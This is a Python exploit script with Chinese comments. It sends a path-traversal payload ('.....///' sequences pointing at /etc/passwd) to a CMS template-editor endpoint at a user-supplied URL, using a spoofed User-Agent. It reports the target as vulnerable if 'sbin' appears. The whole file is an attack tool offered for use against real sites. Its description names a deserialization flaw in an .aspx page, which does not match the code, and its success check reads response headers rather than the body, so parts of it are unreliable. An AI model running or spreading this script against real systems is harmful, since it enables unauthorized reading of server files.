import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='漏洞存在位置/portal/loginpage.aspx可以反序列化漏洞',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')
parser.add_argument('-c', '--cookie', type=str, help='输入当前使用cookie')


args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/index.php?case=template&act=fckedit&admin_dir=admin&site=default"  # 移除末尾的斜杠
    else:
        url = args.url + "/index.php?case=template&act=fckedit&admin_dir=admin&site=default"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': fake.user_agent(),
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Cookie": args.cookie,
    "Connection": "close"
}

data = {
    "id": ".....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///etc/passwd"
}



response = requests.post(url=url,
    headers=headers,
    data=data)

if 'sbin' in response.headers:
    print("目标url："+ url + '\n' +"存在漏洞\n")
    print(response.headers)
else:
    print("目标url："+ url + '\n' +"不存在漏洞")
# print(response.text)